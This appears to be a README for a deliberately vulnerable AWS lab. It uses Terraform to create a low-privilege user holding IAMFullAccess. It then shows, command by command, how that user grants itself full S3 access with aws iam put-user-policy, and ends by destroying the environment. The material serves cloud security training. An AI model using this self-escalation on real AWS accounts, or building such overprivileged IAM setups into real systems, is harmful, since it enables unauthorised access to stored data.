# AWS IAM Privilege Escalation Vulnerable Environment

English | [中文](./README_CN.md)

## Description

This is a scenario used to build the AWS IAM privilege escalation vulnerability environment.

After building the environment with Terraform, The IAM privilege elevation vulnerability can be used to access services that you would not otherwise have permission to access.

## Deployment Environment

Execute the following command in the container

```shell
cd /TerraformGoat/aws/iam/privilege_escalation
```

Configure AWS Access Credentials

```shell
aws configure
```

> You can see the access key in the AWS [Console --> Security Credentials]

Deploy Vulnerable Environment

```shell
terraform init
terraform apply
```

> When the terminal prompts `Enter a value:`, enter `yes`

After building the scenario, use the following command to view the access_key_id and secret_access_key of the low privilege account.

```shell
apt-get install jq -y
terraform state pull | jq '.resources[] | select(.type == "aws_iam_access_key") | .instances[0].attributes'
```

![img](../../../images/1652690733.png)

## Vulnerability Utilization

First configure the access_key_id and secret_access_key of the low privilege account.

```shell
aws configure
```

After the configuration, here is an example of S3 service, try to run the following command, you can see the return message shows that access is denied.

```shell
aws s3 ls
```

![img](../../../images/1652690932.png)

Get the privileges held by the current user.

```shell
aws iam get-user
aws iam list-user-policies --user-name huoxian_terraform_test
aws iam get-user-policy --user-name huoxian_terraform_test --policy-name IAMFullAccess
```

![img](../../../images/1652692179.png)

You can see that the current user has all the privileges of IAM, which means that we can give S3 privileges to the current user, thus enabling the current user to access S3 service resources.

Edit policy file

```shell
vim AmazonS3FullAccess.json
```

The contents of the policy file are as follows:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:*",
                "s3-object-lambda:*"
            ],
            "Resource": "*"
        }
    ]
}
```

PUT policy file

```shell
aws iam put-user-policy --user-name huoxian_terraform_test --policy-name AmazonS3FullAccess --policy-document file://AmazonS3FullAccess.json
```

Try again to get the S3 service resource, you can see that it has been obtained, which means that the policy file is in effect, so that the IAM privilege elevation is achieved.

```shell
aws s3 ls
```

![img](../../../images/1652692416.png)

## Destroy the environment

```shell
aws iam delete-user-policy --user-name huoxian_terraform_test --policy-name AmazonS3FullAccess
terraform destroy
```
